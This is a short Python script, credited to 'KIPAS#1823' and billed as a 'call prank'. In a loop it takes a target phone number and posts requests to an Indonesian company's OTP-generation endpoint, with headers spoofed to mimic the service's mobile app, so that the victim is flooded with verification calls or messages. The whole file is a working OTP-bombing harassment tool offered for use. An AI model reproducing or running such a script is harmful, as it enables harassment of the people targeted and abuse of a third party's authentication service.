import os, requests, json, threading, time, re
os.system('clear')
#Call Prank Made By KIPAS#1823


class Spam:
	def __init__(self, nomor):
		self.nomor = no
	def had(self):
		url = "https://srv3.sampingan.co.id/auth/generate-otp"
		self.nomor = no
		hed = {
                "Content-Type": "application/json",
                "Host": "srv3.sampingan.co.id",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip",
                "User-Agent": "okhttp/4.4.0" 
                }
		dat = json.dumps({"countryCode":"+62","phoneNumber":self.nomor})
		s = requests.post(url,data=dat, headers=hed)
		if 'message' in s.text:
			d = json.loads(s.text)
			print(d['message'])
		else:
				print(s.text)
while True:
	no = input('Nomor Target: ')
	mulai = Spam(1)
	mulai.had()
